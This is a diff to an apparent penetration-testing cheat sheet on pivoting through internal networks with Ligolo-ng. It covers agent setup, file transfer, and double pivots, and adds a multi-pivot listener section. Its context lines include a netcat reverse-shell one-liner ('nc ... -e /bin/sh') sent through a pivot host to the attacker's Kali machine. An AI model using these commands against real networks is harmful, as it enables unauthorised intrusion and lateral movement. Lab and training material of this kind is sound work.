@@ -12,22 +12,23 @@ tags:   [Cheatsheets, Tools, Pivoting]
 - [File Transfer Example with Single Pivot](#file-transfer-example-with-single-pivot)
 - [Reverse Shell Example with Single Pivot](#reverse-shell-example-with-single-pivot)
 - [Easy Double Pivot to Access a Second Internal Network](#easy-double-pivot-to-access-a-second-internal-network)
+- [Fast Pipelines with same Port through Multiple Pivots](#fast-pipelines-with-same-port-through-multiple-pivots)
 
-# Getting Ligolo.ng
+### Getting Ligolo.ng
 Important Note: Make sure you are always using the same version of Proxy and Agent (For example, both Proxy and Agent must be 0.7.2).
 
-## Download the binaries manually (Recommended)
-### PROXY (Run this on Kali)
+#### Download the binaries manually (Recommended)
+##### PROXY (Run this on Kali)
 - [Linux 64-bit Proxy](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz)
 - [Windows 64-bit Proxy](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_windows_amd64.zip)
 
-### AGENT (Run this on Pivot Host)
+##### AGENT (Run this on Pivot Host)
 - [Linux 64-bit Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz)
 - [Windows 64-bit Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip)
 
 For more information about Ligolo-ng, visit its official [GitHub Repository](https://github.com/nicocha30/ligolo-ng).
 
-# Alternative with Package Installer
+#### Alternative with Package Installer
 ```shell
 sudo apt install ligolo-ng
 
@@ -39,7 +40,7 @@ sudo chmod +x agent
 ./agent
 ```
 
-# Basic Pivot
+### Basic Pivot
 Move the agent file into the pivot host:
 ```shell
 # On Kali
@@ -96,7 +97,7 @@ ligolo-ng » session
 # Now we are able to access the network 172.16.150.0/24
 ```
 
-## File Transfer Example with Single Pivot
+### File Transfer Example with Single Pivot
 In this example:
 - We got access into the Host B 172.16.150.20 (We are inside its CLI).
 - We previously set up our Pivot Host A, in this case 172.16.150.10.
@@ -115,7 +116,7 @@ python3 -m http.server 1234
 wget http://172.16.150.10:9001/test.txt
 ```
 
-## Reverse Shell Example with Single Pivot
+### Reverse Shell Example with Single Pivot
 Following the example above, we will create a new listener, but this time we will use that listener to get a Reverse Shell:
 ```shell
 # Create new listener - Port 1235 on Kali will be the Port 9002 on the Pivot Host A
@@ -131,7 +132,7 @@ nc 172.16.150.10 9002 -e /bin/sh
 # Now we successfully got a shell from the Host B (172.16.50.20) to our Kali
 ```
 
-## Easy Double Pivot to Access a Second Internal Network
+### Easy Double Pivot to Access a Second Internal Network
 The following situation is given:
 - We got access to the first internal network (172.16.150.0/24) through Administrator access at Pivot Host A (172.16.150.10).
 - The Host B as access to another internal network (172.16.200.0/24).
@@ -168,4 +169,18 @@ ligolo-ng » session
 [Agent : automotors\Administrator@DC01] » start --tun ligolo2
 
 # Now we can access the second internal network 172.16.200.0/24
+```
+### Fast Pipelines with same Port through Multiple Pivots
+```shell
+# Note: Our Kali IP  in this example is 192.168.45.200
+
+# Add listeners inside Ligolo-Ng console
+# On Session 1 - Pivot Host A (172.16.150.1)
+listener_add --addr 0.0.0.0:9000 --to 0.0.0.0:9000
+
+# On Session 2 - Pivot Host B (172.16.200.1)
+listener_add --addr 0.0.0.0:9000 --to 0.0.0.0:9000
+
+# Now we can access the Port 9000 in our Kali through Port 9000 on Pivot Host B and viceversa
+172.16.200.1:9000 = 192.168.45.200:9000 = 127.0.0.1:9000
 ```
